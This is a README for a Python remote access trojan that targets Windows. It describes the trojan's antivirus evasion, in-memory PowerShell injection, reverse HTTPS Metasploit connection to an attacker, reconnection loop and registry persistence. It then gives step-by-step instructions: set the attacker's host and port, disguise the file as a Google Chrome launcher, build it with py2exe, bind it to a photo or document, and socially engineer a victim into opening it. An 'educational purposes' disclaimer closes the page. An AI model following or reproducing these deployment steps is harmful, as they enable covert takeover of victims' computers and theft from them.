# python-rootkit
 This is a full undetectable python RAT which can bypass almost all antivirus and open a backdoor inside any **windows** machine which will **establish a reverse https Metasploit connection to your listening machine.** 
 
# ViRu5 life cycle
- Bypass all anti-virus.
- Inject a malicius powershell script into memory.
- Establish a reverse https connection to attacker machine.
- Check every 10 seconds and make sure that the connection is still exist, If not it will re-establish a new connection.
- Add a startup register key to re-connect to attacker after reboot.

 # Steps
 - Update viRu5/source.py parameters with your lhost and lport
 - Change source.py name to GoogleChromeAutoLaunch.py
 - Add GoogleChromeAutoLaunch.py, setup.py and your icon as icon.ico to c:\python27 dir
 - From cmd do 
    ```bash
    cd c:\python27
    python setup.py py2exe
    ```
 - Find the RAT exe file in Dist dir.
 - Blind it with any photo, pdf, word or any kind of files
 - Send it to the victim
 - Use your social engineer skills to make him open the file
 - You will recieve a reverse https metasoplit connection :)
 
 # Testing on
 - Windows 7 32bit
 - Winodws 7 64bit
 - Widowns 8 32bit
 - Windows 8 64bit
 - Windows 8.1 32bit
 - Windows 8.1 64 bit
 - Windows 10 32bit
 - Windows 10 64bit
 
# Thanks
Thanks for every security researsher how spend a time to help peaple and make the community more powerfull. Thanks for powerShellEmpire guys.

 # Disclaimer
 This is for Educational purposes ONLY. First of all, this code aims to alarm people about security issues infected unpatched machines.
